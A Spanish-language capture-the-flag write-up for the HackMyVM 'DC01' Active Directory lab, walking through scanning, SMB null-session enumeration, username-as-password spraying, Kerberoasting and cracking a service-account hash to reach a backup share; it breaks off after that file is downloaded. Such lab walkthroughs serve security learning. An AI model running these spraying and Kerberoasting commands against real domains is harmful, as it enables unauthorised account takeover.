# üñ•Ô∏è Writeup - DC01 

**Platform:** HackMyVM  
**Difficulty:** Easy  
**Operating System:** Windows  

# INSTALLATION

Descargamos el `zip` con el `.ova` de la m√°quina DC01, lo extraemos y lo importamos a VirtualBox.

Configuramos la interf√≠cie de red de la m√°quina DC01 y la ejecutamos junto con la atacante.

# HOST DISCOVERY

Aun no sabemos que IP esta associada a la m√°quina DC01, asi que lo descubriremos de la siguiente manera:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:ac:34:13      1      60  PCS Systemtechnik GmbH      
 10.0.4.17       08:00:27:0d:69:c5      1      60  PCS Systemtechnik GmbH
 ```

 Vemos que casi con total seguridad la IP de la maquina victima es la 10.0.4.17

 # PORT SCANNING

A continuaci√≥n, realizamos un escaneo general para comprobar qu√© puertos est√°n abiertos y luego uno m√°s exhaustivo para obtener informaci√≥n relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80,3306 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 14:08 CEST
Nmap scan report for 10.0.4.17
Host is up (0.00015s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 21:09:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:0D:69:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.29 seconds
```
Vemos claramente que es un entorno de Active Directory, y que el dominio es SOUPEDECODE.LOCAL.

Vamos a a√±adir el dominio al archivo /etc/hosts.

Info:
```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.17       SOUPEDECODE.LOCAL
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Ahora vamos a hacer enumeracion del protocolo SMB en busca de informacion sobre shares y usuarios:

```bash
smbclient -L SOUPEDECODE.LOCAL -N
```
Info:
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Podemos enumerar las shares con una NULL session, esto nos da muchisima ventaja, aun asi, vamos a comprobar si tambi√©n funciona un usuario como guest.

```bash
netexec smb SOUPEDECODE.LOCAL -u 'guest' -p ''  --shares
```

Info:
```
SMB         10.0.4.17       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.0.4.17       445    DC01             [*] Enumerated shares
SMB         10.0.4.17       445    DC01             Share           Permissions     Remark
SMB         10.0.4.17       445    DC01             -----           -----------     ------
SMB         10.0.4.17       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.4.17       445    DC01             backup                          
SMB         10.0.4.17       445    DC01             C$                              Default share
SMB         10.0.4.17       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.17       445    DC01             NETLOGON                        Logon server share 
SMB         10.0.4.17       445    DC01             SYSVOL                          Logon server share 
SMB         10.0.4.17       445    DC01             Users
```

Hemos utilizado tanto la NULL session como el usuario guest que esta habilitado para ver las shares, y hemos encontrado 2 shares interesantes: backup y Users, pero no tenemos permisos sobre ellas.

Ya que podemos enumerar empleando una NULL session, vamos a utilizar la herramienta lookupsid.py de impacket para hacer una lista de usuarios del sistema:

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/anonymous@10.0.4.17 > user.txt
```

Habria que manipular la lista para que quedaran solo los nombres de usuario del sistema:

```bash
grep '(SidTypeUser)' user.txt | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > users.txt
```

Vamos a hacer password spraying con estos usuarios 
```bash
crackmapexec smb 10.0.4.17 -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```
Hemos encontrado la contrasenya para ybob317 : ybob317

Ahora que tenemos usuario y contrase√±a podemos comprovar vias de ataque como un ataque kerberoasting o asrep roast:

```bash
impacket-GetUserSPNs -request -dc-ip 10.0.4.17 SOUPEDECODE.LOCAL/ybob317:ybob317
```
Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

No aparece ningun hash pero puede ser por el error de Clock skew too great , que es bastante comun.

Lo solucionamos con el comando:
```bash
sudo rdate -n 10.0.4.17
```

Volvemos a probar y nos da los hashes para cada uno de los servicios, los pondremos todos en un archivo hashes.txt listos para intentar crackearlos.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt  hassh.txt
```
Info:
```
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:31 92.26% (ETA: 15:47:59) 0.03155g/s 419972p/s 2018Kc/s 2018KC/s 128268..12800151
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Hemos obtenido una contrase√±a a partir de uno de los hashes pero no sabemos cual de ellos.
Haremos password spraying otra vez para ver a que usuario pertenece:

```bash
crackmapexec smb 10.0.4.17 -u userss.txt -p 'Password123!!' --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.17       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\firewall_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\backup_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\web_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\monitoring_svc:Password123!! STATUS_LOGON_FAILURE
```

Tenemos la contrase√±a en texto claro de los usuarios ybob317 y file_svc.
Vamos a ver si con este usuario podemos acceder a la SMB share de backup:

```bash
smbclient \\\\10.0.4.17\\backup -U 'file_svc' -p
```
Info:
```
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 19:41:17 2024
  ..                                 DR        0  Mon Jun 17 19:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 10:41:05 2024

		12942591 blocks of size 4096. 10771796 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (79.2 KiloBytes/sec) (average 79.2 KiloBytes/sec)
```
Dentro de backup encontramos un txt, vamos a pasarlo a nuestra maquina para ver que es.
